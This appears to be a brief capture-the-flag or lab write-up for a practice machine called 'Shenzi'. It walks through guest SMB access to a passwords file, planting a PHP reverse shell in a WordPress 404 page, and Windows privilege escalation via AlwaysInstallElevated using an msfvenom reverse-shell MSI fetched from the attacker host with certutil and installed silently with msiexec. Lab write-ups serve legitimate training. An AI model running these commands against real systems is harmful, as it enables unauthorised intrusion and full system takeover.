# Shenzi

### Enumeration

```
$ smbmap -u Guest -H 192.168.189.55
Shenzi   READ ONLY

$ smbclient \\\\192.168.189.55\\Shenzi -U Guest
...
passwords.txt
5) WordPress:
   User: admin
   Password: [REDACTED]
```

[https://192.168.189.55/shenzi/](https://192.168.189.55/shenzi/) - WordPress main directory. I tried just using share name.

### Initial Access

https://revshells.com - Php IvanSincek - 192.168.49.189 - 80 - cmd

Added it to 404.php.

Visited and got reverse shell - http://192.168.189.55/shenzi/404.php

### PrivEsc

winPEASexe - [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries)

```
Checking AlwaysInstallElevated
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                                                         
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.189 LPORT=80 -f msi -o high.msi

certutil.exe -urlcache -split -f "http://192.168.49.189/high.msi"
msiexec /quiet /qn /i C:\Users\shenzi\Desktop\high.msi
```
